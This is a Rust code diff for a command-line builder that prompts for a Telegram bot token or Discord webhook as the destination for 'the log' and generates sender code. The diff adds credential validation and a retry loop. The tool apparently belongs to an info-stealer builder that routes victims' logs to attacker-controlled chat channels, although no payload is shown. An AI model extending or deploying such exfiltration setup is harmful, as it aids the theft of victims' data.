@@ -24,14 +24,23 @@
  * SOFTWARE.
  */
 use std::fmt::Display;
+use std::io::ErrorKind;
 use std::ops::Deref;
+use std::sync::Arc;
+use colored::Colorize;
 use inquire::{required, InquireError, Select, Text};
 use inquire::validator::Validation;
 use proc_macro2::TokenStream;
 use quote::quote;
+use reqwest::blocking::Client;
 use sender::discord_webhook::DiscordWebhookSender;
 use sender::telegram_bot::TelegramBotSender;
 use crate::{Ask, ToExpr};
+
+#[enum_delegate::register]
+trait ValidateRequest {
+    fn validate(&self) -> Result<(), Box<dyn std::error::Error>>;
+}
 
 impl Ask for TelegramBotSender {
     fn ask() -> Result<Self, InquireError>
@@ -56,7 +65,25 @@ impl Ask for TelegramBotSender {
             })
             .prompt()?;
 
-        Ok(Self::new(token, chat_id))
+        Ok(Self::new(chat_id, token))
+    }
+}
+
+impl ValidateRequest for TelegramBotSender {
+    fn validate(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let url = format!(
+            "https://api.telegram.org/bot{}/getChat?chat_id={}",
+            self.token, self.chat_id
+        );
+
+        let client = Client::new();
+        let response = client.get(&url).send()?;
+
+        if response.status().is_success() {
+            Ok(())
+        } else {
+            Err(Box::new(std::io::Error::new(ErrorKind::InvalidInput, "Invalid creds")))
+        }
     }
 }
 
@@ -98,6 +125,19 @@ impl Ask for DiscordWebhookSender {
     }
 }
 
+impl ValidateRequest for DiscordWebhookSender {
+    fn validate(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let client = Client::new();
+        let response = client.get(self.webhook.deref()).send()?;
+
+        if response.status().is_success() {
+            Ok(())
+        } else {
+            Err(Box::new(std::io::Error::new(ErrorKind::InvalidInput, "Invalid webhook")))
+        }
+    }
+}
+
 impl ToExpr for DiscordWebhookSender {
     fn to_expr(&self, _args: ()) -> TokenStream {
         let webhook = self.webhook.deref();
@@ -109,6 +149,7 @@ impl ToExpr for DiscordWebhookSender {
     }
 }
 
+#[enum_delegate::implement(ValidateRequest)]
 #[derive(Clone)]
 pub enum SenderService {
     TelegramBot(TelegramBotSender),
@@ -149,14 +190,21 @@ impl Ask for SenderService {
     where
         Self: Sized
     {
-        let factories: Vec<Box<dyn ServiceFactory>> = vec![
-            Box::new(TelegramFactory),
-            Box::new(DiscordFactory),
+        let factories: Vec<Arc<dyn ServiceFactory>> = vec![
+            Arc::new(TelegramFactory),
+            Arc::new(DiscordFactory),
         ];
 
-        let ans = Select::new("Which service should the log be sent to?", factories)
-            .prompt()?;
+        loop {
+            let ans = Select::new("Which service should the log be sent to?", factories.clone())
+                .prompt()?;
 
-        ans.ask_instance()
+            let instance = ans.ask_instance()?;
+            if instance.validate().is_ok() {
+                return Ok(instance);
+            }
+
+            println!("{}", "[!] Invalid credentials provided, Take another one.".red());
+        }
     }
 }
